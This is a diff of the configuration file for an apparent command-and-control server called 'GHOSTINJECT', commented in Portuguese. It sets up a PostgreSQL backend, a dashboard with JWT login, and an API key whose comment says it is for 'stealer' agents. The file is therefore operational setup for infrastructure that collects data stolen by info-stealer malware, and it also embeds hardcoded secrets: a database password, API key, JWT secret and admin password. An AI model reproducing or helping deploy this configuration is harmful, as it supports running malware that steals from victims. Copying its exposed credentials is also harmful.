@@ -1,18 +1,67 @@
+# ============================================================
+# GHOSTINJECT C2 SERVER CONFIGURATION
+# ============================================================
+
+# ============================================================
+# SERVER CONFIGURATION
+# ============================================================
 [server]
 host = "0.0.0.0"
 port = 8443
-# Em produção, use HTTPS com certificado real
-tls_enabled = false
+workers = 4                        # Número de threads (padrão: 4)
+tls_enabled = false                # HTTPS (true em produção)
 cert_file = "./certs/cert.pem"
 key_file = "./certs/key.pem"
 
+# ============================================================
+# DATABASE CONFIGURATION
+# ============================================================
+
 [database]
-path = "./data/c2.db"
+url = "postgresql://postgres:32368233@127.0.0.1:5433/ghostinject"
 
+# Para PostgreSQL (produção - Railway):
+# url = "postgresql://postgres:password@localhost:5432/ghostinject"
+
+# ============================================================
+# AUTHENTICATION CONFIGURATION
+# ============================================================
 [auth]
-api_key = "YOUR_SECRET_API_KEY_CHANGE_ME"
-discord_webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK/TOKEN"
+# API Key para agentes (stealer)
+api_key = "9e2fa1cf0cae4d84b12918ecdcfa5b3f1f428f66d3b64cec92f5f9cb78a858ec"
 
+# JWT Secret para dashboard (mínimo 32 caracteres)
+jwt_secret = "8bf3907fded348739570fa925db0f732b044b6e1bd944f648ffe7c3947a226a8"
+
+# Senha do admin para login no dashboard
+admin_password = "bfacbadf1213467d95d777b33bd10a29"
+
+# Discord webhook para notificações (opcional)
+discord_webhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_TOKEN"
+
+# Expiração do token JWT em horas
+jwt_expiry_hours = 24
+
+# ============================================================
+# SECURITY CONFIGURATION
+# ============================================================
+[security]
+# Rate limiting: número máximo de requisições por IP por minuto
+rate_limit_per_minute = 100
+
+# IP whitelist (opcional) — deixe vazio para permitir todos
+allowed_ips = []
+
+# CORS (Cross-Origin Resource Sharing)
+enable_cors = true
+
+# Proxies confiáveis para X-Forwarded-For (para rate limiting atrás de proxy)
+trusted_proxies = ["127.0.0.1", "10.0.0.0/8", "172.16.0.0/12", "192.168.0.0/16"]
+
+# ============================================================
+# LOGGING CONFIGURATION
+# ============================================================
 [logging]
-level = "info"
-file = "./data/c2.log"
+level = "info"                     # debug, info, warn, error
+file = "./data/c2.log"             # Caminho do arquivo de log
+json_format = false                # true = JSON format (produção)
